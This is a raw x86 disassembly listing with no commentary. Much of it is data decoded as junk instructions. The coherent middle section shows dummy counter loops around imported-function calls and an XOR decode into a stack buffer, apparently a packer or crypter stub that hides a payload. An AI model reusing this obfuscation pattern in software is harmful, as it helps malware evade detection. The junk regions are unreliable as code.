  410c43:	fimul  DWORD PTR [ecx-0x5c]
  410c46:	es or  al,0x10
  410c49:	cmp    BYTE PTR [esi],al
  410c4b:	mov    ds:0x2e884def,eax
  410c50:	jmp    0xca58a079
  410c55:	aam    0x23
  410c57:	dec    esp
  410c58:	clc    
  410c59:	dec    edx
  410c5a:	mov    edx,0xd8c98513
  410c5f:	jno    0x410c8f
  410c61:	test   al,0x74
  410c63:	and    DWORD PTR [esi],ebp
  410c65:	ret    
  410c66:	jmp    0x410ce6
  410c68:	add    BYTE PTR [edi-0x49a9bc6],dh
  410c6e:	cld    
  410c6f:	js     0x410bff
  410c71:	and    eax,0x9d678a90
  410c76:	push   0xb
  410c78:	pop    ebx
  410c79:	std    
  410c7a:	mov    dl,0x17
  410c7c:	inc    DWORD PTR [edi]
  410c7e:	cli    
  410c7f:	pop    ecx
  410c80:	test   bh,dl
  410c82:	clc    
  410c83:	pusha  
  410c84:	push   eax
  410c85:	out    0x7b,al
  410c87:	les    edx,FWORD PTR [edi+0x7e]
  410c8a:	pop    edx
  410c8b:	sbb    eax,DWORD PTR [esi+0xf]
  410c8e:	pusha  
  410c8f:	outs   dx,BYTE PTR ds:[esi]
  410c90:	xchg   esi,eax
  410c91:	fmul   DWORD PTR [esp+edx*1-0x1]
  410c95:	sbb    eax,DWORD PTR [edi-0x710eda66]
  410c9b:	in     al,dx
  410c9c:	and    eax,DWORD PTR [esi]
  410c9e:	leave  
  410c9f:	rcpps  xmm5,XMMWORD PTR [ebx-0x36]
  410ca3:	pop    ss
  410ca4:	cmc    
  410ca5:	dec    esi
  410ca6:	out    dx,eax
  410ca7:	or     bh,BYTE PTR [eax-0x22]
  410caa:	and    DWORD PTR [eax+0x69],ecx
  410cad:	(bad)  
  410cae:	cld    
  410caf:	mov    cl,0x23
  410cb1:	cld    
  410cb2:	mov    dl,0x38
  410cb4:	xchg   edx,eax
  410cb5:	fsub   DWORD PTR [ebx-0x73]
  410cb8:	(bad)  
  410cb9:	fidiv  DWORD PTR [esi]
  410cbb:	add    edi,edi
  410cbd:	sbb    DWORD PTR [ebx-0x1cfcf508],ebx
  410cc3:	in     eax,dx
  410cc4:	shl    BYTE PTR [esi+0x76],cl
  410cc7:	fadd   DWORD PTR [eax]
  410cc9:	pop    esp
  410cca:	rcl    BYTE PTR [eax+ebx*8-0x5c23e839],1
  410cd1:	push   ebp
  410cd2:	fmul   QWORD PTR [ebp+0x1b]
  410cd5:	jle    0x410c8d
  410cd7:	leave  
  410cd8:	call   0xeb92:0x14921ca4
  410cdf:	int    0x85
  410ce1:	das    
  410ce2:	cld    
  410ce3:	jp     0x410cae
  410ce5:	mov    eax,0x6b2c88c7
  410cea:	xchg   edx,eax
  410ceb:	js     0x410d2e
  410ced:	sbb    ebx,edx
  410cef:	cmp    DWORD PTR [edi-0x1e],ebx
  410cf2:	and    DWORD PTR [edi+0x1a],0xbf21c21b
  410cf9:	lds    ecx,FWORD PTR [edi-0x30]
  410cfc:	push   ecx
  410cfd:	xchg   ecx,eax
  410cfe:	popa   
  410cff:	sub    al,0x37
  410d01:	xor    edx,DWORD PTR [ebx]
  410d03:	cmp    bl,BYTE PTR [eax]
  410d05:	addr16 jge 0x410c92
  410d08:	or     edi,esp
  410d0a:	mov    cl,0x21
  410d0c:	pop    ecx
  410d0d:	out    dx,al
  410d0e:	pop    edx
  410d0f:	jnp    0x410d43
  410d11:	iret   
  410d12:	fs jge 0x410d69
  410d15:	lds    esp,FWORD PTR [edx+ebx*8]
  410d18:	and    BYTE PTR [eax],bl
  410d1a:	rcl    DWORD PTR [ecx+0x787b2b86],1
  410d20:	test   ah,dh
  410d22:	fsub   st,st(2)
  410d24:	repnz and al,dl
  410d27:	(bad)  
  410d28:	cdq    
  410d29:	jg     0x410d7e
  410d2b:	push   ecx
  410d2c:	leave  
  410d2d:	mov    ecx,ecx
  410d2f:	scas   al,BYTE PTR es:[edi]
  410d30:	aaa    
  410d31:	push   es
  410d32:	jge    0x410d93
  410d34:	cmp    eax,0x89814698
  410d39:	mov    ds:0x14ecfb9b,eax
  410d3e:	mov    cs,WORD PTR [ebx]
  410d40:	in     eax,0xbf
  410d42:	sub    eax,0x71b91dba
  410d47:	scas   eax,DWORD PTR es:[edi]
  410d48:	sub    eax,0x1b7b20b2
  410d4d:	cli    
  410d4e:	test   BYTE PTR [edi*4+0x4d22dbcb],0xfc
  410d56:	sbb    DWORD PTR [esi],ebx
  410d58:	mov    edx,0x2e3cff2b
  410d5d:	and    DWORD PTR [esi],edi
  410d5f:	gs inc ecx
  410d61:	sub    BYTE PTR [eax+ebx*8-0x68],cl
  410d65:	inc    DWORD PTR [edx-0x3c4432d0]
  410d6b:	test   al,0x78
  410d6d:	xchg   ebx,eax
  410d6e:	pop    ebx
  410d6f:	idiv   BYTE PTR ds:[ebx-0x8]
  410d73:	out    0xd7,eax
  410d75:	in     al,dx
  410d76:	shr    DWORD PTR [eax],0xe7
  410d79:	mov    ch,dl
  410d7b:	add    eax,0x17effbd4
  410d80:	in     eax,dx
  410d81:	mov    ah,0x39
  410d83:	fmul   DWORD PTR ds:0x76de3a1
  410d89:	xor    eax,0x84d58f10
  410d8e:	fdiv   QWORD PTR [ecx]
  410d90:	(bad)  
  410d91:	pushf  
  410d92:	jnp    0x410d71
  410d94:	ror    BYTE PTR [esp+ecx*1+0x3e],0xda
  410d99:	fst    QWORD PTR [esi]
  410d9b:	(bad)  [esi]
  410d9e:	pop    edi
  410d9f:	rol    DWORD PTR [ecx+0xa],cl
  410da2:	mov    al,0xdd
  410da4:	(bad)  
  410da5:	mov    ebx,0xb7963554
  410daa:	cli    
  410dab:	jl     0x410d6c
  410dad:	fimul  DWORD PTR [ebx-0x4fb24030]
  410db3:	into   
  410db4:	inc    esi
  410db5:	adc    DWORD PTR [edx+0x120fb384],ecx
  410dbb:	or     al,0x22
  410dbd:	xor    DWORD PTR [ebx+0x13],0xecf28d7
  410dc4:	adc    DWORD PTR [esi],0xd8813ea3
  410dca:	add    esp,DWORD PTR [edx-0x12]
  410dcd:	sbb    DWORD PTR [eax+esi*1+0x1a],esi
  410dd1:	into   
  410dd2:	test   cl,dl
  410dd4:	or     DWORD PTR [esi],ebp
  410dd6:	fcmovbe st,st(4)
  410dd8:	clc    
  410dd9:	test   eax,0x7c2028af
  410dde:	sbb    al,0xe7
  410de0:	mov    al,0x48
  410de2:	mov    eax,ds:0xfe9717b7
  410de7:	shl    BYTE PTR [ebx+0x2f],1
  410dea:	in     eax,dx
  410deb:	cmp    DWORD PTR [ebp+0x5c],esi
  410dee:	stos   DWORD PTR es:[edi],eax
  410def:	pop    edi
  410df0:	mov    al,ds:0xa1a25757
  410df5:	fwait
  410df6:	xor    BYTE PTR [edx-0x2ee06418],dl
  410dfc:	xor    BYTE PTR [edx],cl
  410dfe:	es scas eax,DWORD PTR es:[edi]
  410e00:	jbe    0x410db0
  410e02:	pop    bx
  410e04:	inc    edi
  410e05:	push   esi
  410e06:	fs or  bh,bl
  410e09:	out    dx,al
  410e0a:	loopne 0x410e32
  410e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e0d:	sub    esp,edx
  410e0f:	inc    BYTE PTR [edx]
  410e11:	add    DWORD PTR [ebp-0x31784ab6],edx
  410e17:	push   ecx
  410e18:	aas    
  410e19:	push   esp
  410e1a:	emms   
  410e1c:	mov    DWORD PTR [edx*2+0x13a0f68a],ebp
  410e23:	call   0xce5bbdce
  410e28:	loopne 0x410dde
  410e2a:	mov    esi,0x587b762
  410e2f:	adc    DWORD PTR [esi],ebp
  410e31:	mov    ?,WORD PTR [edi]
  410e33:	or     eax,0xa2f2973c
  410e38:	xchg   ebx,eax
  410e39:	dec    ebx
  410e3a:	mov    ds:0xbd230d7d,al
  410e3f:	sbb    ch,BYTE PTR [ebx+eax*2]
  410e42:	mov    bl,0x86
  410e44:	push   ebx
  410e45:	adc    BYTE PTR [edx-0x71a14346],bl
  410e4b:	mov    ds:0xa461ec11,al
  410e50:	in     eax,dx
  410e51:	sbb    ch,BYTE PTR [ebp-0x3a]
  410e54:	cmp    edx,ecx
  410e56:	mov    dh,0xa4
  410e58:	dec    ecx
  410e59:	stos   BYTE PTR es:[edi],al
  410e5a:	pop    edx
  410e5b:	ins    DWORD PTR es:[edi],dx
  410e5c:	jb     0x410e8d
  410e5e:	int3   
  410e5f:	gs pop eax
  410e61:	pop    es
  410e62:	lahf   
  410e63:	push   ds
  410e64:	mov    al,0x21
  410e66:	repnz cwde 
  410e68:	jbe    0x410e11
  410e6a:	jns    0x410dfa
  410e6c:	inc    ebx
  410e6d:	xchg   ecx,eax
  410e6e:	int3   
  410e6f:	and    edx,0xec6efce4
  410e75:	out    0xd7,eax
  410e77:	rol    DWORD PTR ds:0x7083db4e,1
  410e7d:	cli    
  410e7e:	out    dx,al
  410e7f:	aas    
  410e80:	sbb    DWORD PTR ds:0xf22e0ab7,eax
  410e86:	ret    
  410e87:	les    ebp,FWORD PTR [esi]
  410e89:	aam    0x14
  410e8b:	outs   dx,BYTE PTR ds:[esi]
  410e8c:	dec    eax
  410e8d:	or     al,0x5b
  410e8f:	xchg   esi,eax
  410e90:	lds    ebp,FWORD PTR [eax]
  410e92:	adc    cl,dl
  410e94:	inc    ebx
  410e95:	mov    ecx,0x28878d5
  410e9a:	jbe    0x410e6a
  410e9c:	or     ecx,DWORD PTR [edx]
  410e9e:	(bad)  
  410e9f:	addr16 add edx,edx
  410ea2:	pop    eax
  410ea3:	sti    
  410ea4:	gs gs sub bl,al
  410ea8:	push   0x27eea1cc
  410ead:	inc    esi
  410eae:	leave  
  410eaf:	push   esp
  410eb0:	out    0xe1,al
  410eb2:	push   ds
  410eb3:	dec    esi
  410eb4:	jmp    0x7f3eee8d
  410eb9:	sub    BYTE PTR [eax-0x1d],dh
  410ebc:	fcomip st,st(7)
  410ebe:	mov    edi,0xdd0da907
  410ec3:	cmp    ecx,ecx
  410ec5:	repnz add DWORD PTR [ebx-0x56b4edba],ebp
  410ecc:	jle    0x410f4a
  410ece:	les    edi,FWORD PTR [esi-0x28678a88]
  410ed4:	mov    dh,0x70
  410ed6:	add    eax,0x96cab8b1
  410edb:	mov    esi,0x10dc8f22
  410ee0:	lahf   
  410ee1:	loopne 0x410ee6
  410ee3:	pop    gs
  410ee5:	jnp    0x410ef9
  410ee7:	inc    BYTE PTR [edx-0x67868ba5]
  410eed:	mov    DWORD PTR [ecx],esi
  410eef:	out    0xad,eax
  410ef1:	mov    ebx,0x9060e3e1
  410ef6:	jb     0x410f54
  410ef8:	shl    DWORD PTR [ebx],cl
  410efa:	pop    ds
  410efb:	mov    eax,ds:0x7aba99e9
  410f00:	mov    eax,ds:0xa78ebe7c
  410f05:	pop    esp
  410f06:	push   cs
  410f07:	sbb    al,0x6d
  410f09:	jecxz  0x410f19
  410f0b:	jo     0x410f19
  410f0d:	push   ebx
  410f0e:	mov    edx,0x817cd70e
  410f13:	fmul   st,st(7)
  410f15:	rol    eax,0x31
  410f18:	and    DWORD PTR [edi+0x6d],edi
  410f1b:	cdq    
  410f1c:	inc    edx
  410f1d:	fmul   DWORD PTR [edi]
  410f1f:	or     ah,BYTE PTR [ebx+0x3e]
  410f22:	rcr    dl,cl
  410f24:	addr16 nop
  410f26:	mov    ebx,0x30fafb01
  410f2b:	xchg   BYTE PTR [ebp-0x6a],ch
  410f2e:	xor    dl,BYTE PTR [eax]
  410f30:	daa    
  410f31:	inc    edi
  410f32:	sub    al,0x4d
  410f34:	sbb    ch,BYTE PTR [edi+0x58]
  410f37:	outs   dx,BYTE PTR ds:[esi]
  410f38:	(bad)  
  410f39:	aad    0x81
  410f3b:	inc    edi
  410f3c:	sbb    eax,0x14
  410f3f:	neg    DWORD PTR ss:[edi]
  410f42:	push   cs
  410f43:	add    BYTE PTR [ebx],dh
  410f45:	or     DWORD PTR [edi+eax*1],eax
  410f48:	outs   dx,DWORD PTR ds:[esi]
  410f49:	ficomp DWORD PTR [ebp-0x3a]
  410f4c:	stc    
  410f4d:	loope  0x410fc5
  410f4f:	mov    edx,0x3b63cfb6
  410f54:	inc    ebx
  410f55:	or     DWORD PTR [esi],eax
  410f57:	and    ebx,esp
  410f59:	pandn  mm1,QWORD PTR [edi+ebx*1]
  410f5d:	mov    ds:0x787b7ecf,eax
  410f62:	fcom   st(7)
  410f64:	outs   dx,DWORD PTR ds:[esi]
  410f65:	adc    edi,DWORD PTR [ebx-0x65]
  410f68:	mov    ebx,0x8ae0713d
  410f6d:	mov    ecx,0x8829d237
  410f72:	xchg   ecx,eax
  410f73:	icebp  
  410f74:	push   cs
  410f75:	sub    DWORD PTR [eax+eax*1],edx
  410f78:	sti    
  410f79:	cmp    al,0xb8
  410f7b:	mov    ds:0x30421b44,eax
  410f80:	test   eax,0xf1eb2fea
  410f85:	sbb    BYTE PTR [edi+0x70],al
  410f88:	jle    0x410fcb
  410f8a:	ins    BYTE PTR es:[edi],dx
  410f8b:	pop    eax
  410f8c:	and    eax,0x5c973fc6
  410f91:	aad    0x85
  410f93:	je     0x411007
  410f95:	jae    0x411015
  410f97:	shl    DWORD PTR ds:0x6eb6aeab,1
  410f9d:	inc    esp
  410f9e:	shl    DWORD PTR [eax],1
  410fa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fa1:	scas   eax,DWORD PTR es:[edi]
  410fa2:	rcr    bh,1
  410fa4:	(bad)  
  410fa6:	jno    0x410fd9
  410fa8:	lods   al,BYTE PTR ds:[esi]
  410fa9:	jbe    0x410fa2
  410fab:	das    
  410fac:	fld    DWORD PTR [esi-0x5e83d064]
  410fb2:	jo     0x410fce
  410fb4:	lock adc edx,DWORD PTR [eax+0x65e64ae1]
  410fbb:	add    cl,BYTE PTR ds:0x2f569963
  410fc1:	xor    esp,DWORD PTR [eax+0x60]
  410fc4:	loopne 0x410f51
  410fc6:	sub    al,0x8a
  410fc8:	push   0x8aca39d
  410fcd:	imul   ebp,DWORD PTR [ecx-0x5eeb2b22],0xffffff93
  410fd4:	mov    dl,0x8f
  410fd6:	imul   edx,DWORD PTR [esi-0x4ab6587e],0xcbad851f
  410fe0:	add    edx,DWORD PTR [ebx-0xb34a7be]
  410fe6:	jecxz  0x411050
  410fe8:	mov    ebx,0xbf339647
  410fed:	pop    ebp
  410fee:	mov    bh,0x22
  410ff0:	push   esi
  410ff1:	leave  
  410ff2:	std    
  410ff3:	ret    0x44df
  410ff6:	jae    0x410f98
  410ff8:	lods   al,BYTE PTR ds:[esi]
  410ff9:	hlt    
  410ffa:	cmp    eax,ebp
  410ffc:	jno    0x41104c
  410ffe:	xor    DWORD PTR [edi-0x6],edx
  411001:	pop    eax
  411002:	cmp    BYTE PTR [edi],ah
  411004:	mov    edx,0x7a1b423d
  411009:	outs   dx,DWORD PTR ds:[esi]
  41100a:	pop    esi
  41100b:	je     0x410f94
  41100d:	lds    esi,FWORD PTR [eax-0x3]
  411010:	jge    0x411017
  411012:	outs   dx,BYTE PTR ds:[esi]
  411013:	mov    WORD PTR [ecx-0x5279c808],cs
  411019:	stos   BYTE PTR es:[edi],al
  41101a:	mov    edi,DWORD PTR [ecx]
  41101c:	in     eax,0x28
  41101e:	pushf  
  41101f:	fst    DWORD PTR [esi-0x31]
  411022:	push   0x84d8bc1
  411027:	mov    eax,0x8a8d
  41102c:	xor    ax,WORD PTR [ecx+0x20]
  411030:	adc    DWORD PTR ds:0x42b000,0x1520
  41103a:	mov    ecx,0x3b51
  41103f:	or     DWORD PTR ds:0x42a008,0x52f2
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	add    BYTE PTR [eax],dl
  4115ad:	aaa    
  4115ae:	sub    DWORD PTR [eax-0x51],eax
  4115b1:	jl     0x41162f
  4115b3:	inc    eax
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	inc    ecx
  4115b8:	or     ah,cl
  4115ba:	aaa    
  4115bb:	xor    DWORD PTR [ebx+0x796e474e],ecx
  4115c1:	adc    esp,esi
  4115c3:	daa    
  4115c4:	int3   
  4115c5:	and    al,0xed
  4115c7:	je     0x411637
  4115c9:	mov    cl,0xf2
  4115cb:	inc    edx
  4115cc:	or     BYTE PTR [edi-0x71],0x0
  4115d0:	js     0x411621
  4115d2:	inc    esi
  4115d3:	scas   al,BYTE PTR es:[edi]
  4115d4:	jno    0x41159b
  4115d6:	outs   dx,BYTE PTR ds:[esi]
  4115d7:	fsubr  st(7),st
  4115d9:	popa   
  4115da:	das    
  4115db:	mov    ss,WORD PTR [ebx+0xe]
  4115de:	xchg   ebx,eax
  4115df:	scas   al,BYTE PTR es:[edi]
  4115e0:	xlat   BYTE PTR ds:[ebx]
  4115e1:	(bad)  
  4115e2:	fmul   QWORD PTR [ebx]
  4115e4:	jge    0x411613
  4115e6:	arpl   WORD PTR [edi+0x6a],si
  4115e9:	mov    dl,0x6b
  4115eb:	add    dh,BYTE PTR ds:0xf6424cfe
  4115f1:	mov    edx,edi
  4115f3:	or     BYTE PTR [esi-0x46],0x77
  4115f7:	shl    DWORD PTR [eax+0x50afec83],cl
  4115fd:	jo     0x41165e
  4115ff:	mov    ch,0x65
  411601:	xchg   ecx,eax
  411602:	push   ss
  411603:	dec    ebx
  411604:	mov    dh,0xed
  411606:	lds    edx,FWORD PTR [esi-0x72]
  411609:	mov    bh,BYTE PTR [ecx-0x23]
  41160c:	push   eax
  41160d:	adc    ebp,esp
  41160f:	mov    dh,0x44
  411611:	jb     0x41167c
  411613:	and    DWORD PTR [ecx],ecx
  411615:	test   eax,0x842322cb
  41161a:	jns    0x4115db
  41161c:	es ret 
